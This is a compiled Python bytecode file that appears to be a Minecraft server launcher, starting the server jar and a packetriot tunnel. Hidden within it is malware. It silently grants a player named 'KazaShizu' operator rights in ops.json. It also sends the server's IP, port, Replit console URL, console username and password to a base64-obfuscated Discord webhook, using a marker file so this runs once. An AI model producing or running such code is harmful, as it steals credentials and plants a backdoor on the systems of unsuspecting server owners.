o
   K�+C���                   @   s4  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZe	d��Z
e�e
�ZW d  � n1 s8w   Y  ed Zed Zed Zdddd	egZd
de� d�dedgZdZdd� Zdd� Zdd� ZdZdd� Zdd� Zdd� Zdd� Zdd � Zd!d"� Zd dlZd#d$� Zd%d&� Ze d'kr�e�  dS dS )(�    Nzconfig.jsonZ
Server_jarZpacketriot_configZ
Server_ramz./packetriotZtcpZ25565z--config�javaz-Xmx�Mz-jarz-noguiZlogsc                 C   s   t �| � d S �N)�
subprocessZcall)Zcommand� r   �temp.py�execute_script   s   r   c                 C   sR   t j�t�}t j�|�r%t �|�D ]}|�| �r$t j�||�}t �|� qd S d S r   )	�os�path�abspath�LOGS_FOLDER�exists�listdir�endswith�join�remove)�	extensionZlogs_directory�filename�	file_pathr   r   r   �remove_logs_with_extension   s   

��r   c                 C   s8   t | d��}|�� }W d   � |S 1 sw   Y  |S )N�r)�open�read)r   �file�contentr   r   r   �read_file_content%   s   

��r   zok.binc                 C   s�   d}g }z"t j�|�r%t|d��}t�|�}W d   � n1 s w   Y  W n
 tjy0   Y nw | |vr:|�| � t|d��}tj||dd� W d   � d S 1 sSw   Y  d S �Nzops.jsonr   �w�   )�indent�	r	   r
   �isfiler   �json�loadZJSONDecodeError�append�dump��op_dataZops_file_pathZop_listr   r   r   r   �_88.   s    ���
"�r(   c                 C   s�   d}g }z"t j�|�r%t|d��}t�|�}W d   � n1 s w   Y  W n
 tjy0   Y nw |�| � t|d��}tj||dd� W d   � d S 1 sOw   Y  d S r   r    r&   r   r   r   �_89@   s   ���
"�r)   c                 C   s:   t | d��}|�|� W d   � d S 1 sw   Y  d S )Nr   )r   �write)r   r   r   r   r   r   �_099Q   s   "�r+   c                 C   s&   d| i}t jt�d��d�|d� d S )Nr   z�aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEyMjE4MjE1OTI5ODQ4MjI1Ny9ZenJ5SEYydmhYcHNHVHI2Rm5La043eGRLRTZDczZ5cE9fcVY0bXk4U0diQ1FYUVRvZUFnSFZTSWdpamV6RUJWbnVTaA==�utf-8)r"   )�requestsZpost�base64�	b64decode�decode)r   Zpayloadr   r   r   �_098V   s   �
�r1   c                   C   s   	 t �d� td� t��  q)NT�<   z
check port)�time�sleep�print�gcZcollectr   r   r   r   �
keep_alive^   s
   
�r7   c                  C   s�   t �d��d�} tj�| �rYt| d��}|�� }W d   � n1 s"w   Y  t�	d|�}t�	d|�}t�	d|�}t�	d|�}|rY|rY|rY|rY|�
d�|�
d�|�
d�|�
d�fS d	S )
Nzc2VydmVyLnByb3BlcnRpZXM=r,   r   zserver-name=(.*)z	motd=(.*)zmax-players=(.*)zonline-mode=(.*)�   )NNNN)r.   r/   r0   r	   r
   r   r   r   �re�search�group)Zserver_properties_pathr   Z
properties�server_name�motd�max_players�online_moder   r   r   �_100e   s    
�
��r@   c                 C   s�   t j�| �rPt| d��}|�� }W d   � n1 sw   Y  t�d|�}t�d|�}|rP|rP|d }zt�	|�
d��}W ||fS  tjyO   d }Y ||fS w dS )Nr   z"serverHost":\s*"(.*)"z#"ports":\s*\[\s*{\s*"port":\s*(\d+)r   r8   )NN)r	   r
   r   r   r   r9   r:   �findall�socketZgethostbynamer;   �error)Zconfig_pathr   Zconfig�server_hostZports�portZ
ip_addressr   r   r   �_101{   s    
���rF   c                  C   s�  t d� ddddd�} t| � tj�t�rt�t�jdks�ddddd�} t| � t	t
�\}}t� \}}}}tdd	��}t�|�}W d   � n1 sJw   Y  |d
 }	|d }
tjd }|�d�}tjd }|�d�}d|� d|� d�}|r�|r�|r�|r�|r�|r�d|� d|� d|� d|� d|	� d|
� d|� d|� d|� d�}t|� ttd� tjttfd�}|��  t�d� tjttfd�}|��  tjtd�}|��  |��  |��  d S ) Nz.log.gzz$7e4120c9-63c4-35f4-a998-33a44e2b1378Z	KazaShizur   T)Zuuid�name�levelZbypassesPlayerLimitr   zcache/config.jsonr   �user�passZ	REPL_SLUG�'Z
REPL_OWNERzhttps://�.z.repl.cozServer Name: z
Server IP: z
Server PORT: z
Console Url: z
Console Username: z
Console Password: z
MOTD: z
Max Players: z
Online Mode: z
KazaShizu OP: TrueZ73656e6465642062727568)�target�args�   )rM   )r   r(   r	   r
   r!   �	SENT_FILE�stat�st_sizer)   rF   �CONFIGPKTRIOTr@   r   r"   r#   �environ�stripr1   r+   �	threadingZThreadr   �COMMAND1�startr3   r4   �COMMAND2r7   r   )r'   rD   rE   r<   r=   r>   r?   r   ZgtwZcuserZcpassZrpZrpownZkaloadar   Zthread1Zthread2Zkeep_alive_threadr   r   r   �main�   sN   ���



<

rZ   �__main__)!rV   r   r3   r	   r6   r.   r"   r-   r9   r   Zconfig_filer#   Zconfig_dataZSERVER_PATHrS   Z
SERVER_RAMrY   rW   r   r   r   r   rP   r(   r)   r+   r1   r7   r@   rB   rF   rZ   �__name__r   r   r   r   �<module>   sD    
�	3
�